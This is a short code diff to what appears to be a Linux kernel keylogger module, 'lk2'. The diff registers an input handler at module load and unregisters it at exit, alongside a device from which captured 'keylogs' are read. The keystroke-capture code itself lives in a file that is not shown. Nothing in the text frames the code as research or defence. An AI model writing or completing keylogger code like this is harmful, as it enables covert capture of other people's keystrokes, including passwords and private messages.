@@ -4,6 +4,7 @@
 
 #include "lk2.h"
 
+// Global ring accessible from lk2_input.c
 struct lk2_ring g_lk2_ring;
 
 static int lk2_build_snapshot(char **out_buf, size_t *out_len)
@@ -24,6 +25,8 @@ static int lk2_build_snapshot(char **out_buf, size_t *out_len)
 	*out_len = sizeof(placeholder) - 1;
 	return 0;
 }
+
+// misc device file ops
 
 static int keylogs_open(struct inode *inode, struct file *file)
 {
@@ -97,12 +100,21 @@ static int __init lk2_init(void)
 		return err;
 	}
 
+	err = lk2_input_register();
+	if (err)
+	{
+		pr_err("lk2: input handler registration failed: %d\n", err);
+		misc_deregister(&keylogs_miscdev);
+		return err;
+	}
+
 	pr_info("loaded. Read logs from /dev/%s\n", LK2_DEVICE_NAME);
 	return 0;
 }
 
 static void __exit lk2_exit(void)
 {
+	lk2_input_unregister();
 	misc_deregister(&keylogs_miscdev);
 
 	pr_info("exiting\n");
